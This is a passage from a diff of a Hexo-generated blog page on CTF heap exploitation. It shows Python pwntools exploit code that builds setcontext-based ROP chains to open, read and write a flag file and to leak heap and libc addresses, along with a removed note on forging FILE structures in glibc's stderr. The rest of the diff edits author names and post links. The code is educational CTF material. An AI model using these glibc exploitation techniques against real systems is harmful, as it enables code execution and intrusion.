class="hljs-number">0x10</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x70</span>)+p64(<span class="hljs-number">0</span>)+p64(read)<br>        res += p64(ret)+p64(pop_rdx)+p64(f1_addr+<span class="hljs-number">0x28</span>)+p64(ret)<br>        res += p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x70</span>)*<span class="hljs-number">2</span>+p64(write)<br>        res += <span class="hljs-string">b&#x27;flag\x00&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        flag = f1_addr + <span class="hljs-number">0xf8</span><br>        res = p64(<span class="hljs-number">0</span>)+p64(f1_addr)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(setcontext+<span class="hljs-number">61</span>)<br>        res += p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(pop_rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>        res += p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(flag+<span class="hljs-number">0x10</span>)+p64(pop_rax)+p64(<span class="hljs-number">0</span>)<br>        res += p64(ret)+p64(pop_rdx)+p64(f1_addr+<span class="hljs-number">0x28</span>)+p64(ret)<br>        res += p64(pop_rdx)+p64(<span class="hljs-number">0x70</span>)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>        res += p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rax)+p64(<span class="hljs-number">1</span>)+p64(syscall)<br>        res += <span class="hljs-string">b&#x27;flag\x00&#x27;</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_heap_addr</span>(<span class="hljs-params">sh, show, pie</span>):<br>    addr = <span class="hljs-number">0</span><br>    addr = u64(sh.recvuntil(<span class="hljs-string">&quot;\x55&quot;</span>, timeout=<span class="hljs-number">0.1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">if</span> pie == <span class="hljs-number">0</span>:<br>        addr = u64(sh.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>        <span class="hljs-keyword">if</span> addr &amp; <span class="hljs-number">0xa000000</span> != <span class="hljs-number">0</span>:<br>            addr = addr - <span class="hljs-number">0xa000000</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> addr == <span class="hljs-number">0</span>:<br>            addr = u64(sh.recvuntil(<span class="hljs-string">&quot;\x56&quot;</span>, timeout=<span class="hljs-number">0.1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">if</span> show == <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;addr:&quot;</span>, <span class="hljs-built_in">hex</span>(addr))<br>        pause()<br>    <span class="hljs-keyword">return</span> addr<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_libc_addr</span>(<span class="hljs-params">sh, show</span>):<br>    addr = <span class="hljs-number">0</span><br>    addr = u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>, timeout=<span class="hljs-number">0.2</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">if</span> addr == <span class="hljs-number">0</span>:<br>        addr = u64(sh.recvuntil(<span class="hljs-string">&quot;\x7e&quot;</span>, timeout=<span class="hljs-number">0.2</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">if</span> show == <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;addr:&quot;</span>, <span class="hljs-built_in">hex</span>(addr))<br>        pause()<br>    <span class="hljs-keyword">return</span> addr<br><br><br><br></code></pre></td></tr></table></figure>
 
 
 
-<h2 id="关于stderr"><a href="#关于stderr" class="headerlink" title="关于stderr"></a>关于stderr</h2><p>在许多题目的经验中，我们会发现往往有两个stderr的诡异现象；</p>
-<p>在2024年2月份的异常NSSCTF中，就遇到了这样的事情：</p>
-<p><img src="/images/1707896656574.png" alt="1707896656574"></p>
-<p>在<code>__fxprintf</code>+343的地方rax使用的是elf空间的stderr；</p>
-<p>针对这种情况，笔者的做法是将fake_strcut部署在了<code>_IO_2_1_stderr_</code>中，最终get_shell；</p>
 
                 
             </div>
@@ -453,7 +436,7 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
+                    <a href="/about" rel="external nofollow noreferrer">q1ming</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -463,7 +446,7 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2025/01/15/assert/">http://example.com/2025/01/15/assert/</a>
+                    <a href="http://example.com/2025/01/16/house_of_apple2/">http://example.com/2025/01/16/house_of_apple2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -476,7 +459,7 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
                     All articles in this blog are used except for special statements
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     reprint policy. If reproduced, please indicate source
-                    <a href="/about" target="_blank">John Doe</a>
+                    <a href="/about" target="_blank">q1ming</a>
                     !
                 </span>
             </div>
@@ -585,13 +568,13 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2025/01/15/glibc-2.39-house_of_apple2/">
+                <a href="/2025/01/16/house_of_husk/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="glibc-2.39:house_of_apple2">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="house_of_husk">
                         
-                        <span class="card-title">glibc-2.39:house_of_apple2</span>
+                        <span class="card-title">house_of_husk</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -602,22 +585,18 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-15
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-16
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            q1ming
                             
                         </span>
                     </div>
                 </div>
                 
                 <div class="card-action article-tags">
-                    
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
                     
                     <a href="/tags/Heap/">
                         <span class="chip bg-color">Heap</span>
@@ -634,13 +613,13 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/01/15/house_of_apple2/">
+                <a href="/2025/01/16/go/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="house_of_apple2">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="go语言学习笔记">
                         
-                        <span class="card-title">house_of_apple2</span>
+                        <span class="card-title">go语言学习笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -651,12 +630,12 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-16
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            q1ming
                             
                         </span>
                     </div>
@@ -664,8 +643,8 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Heap/">
-                        <span class="chip bg-color">Heap</span>
+                    <a href="/tags/Go/">
+                        <span class="chip bg-color">Go</span>
                     </a>
                     
                 </div>
@@ -856,7 +835,7 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
             
                 <span id="year">2019-2025</span>
             
-            <a href="/about" target="_blank">John Doe</a>
+            <a href="/about" target="_blank">q1ming</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             
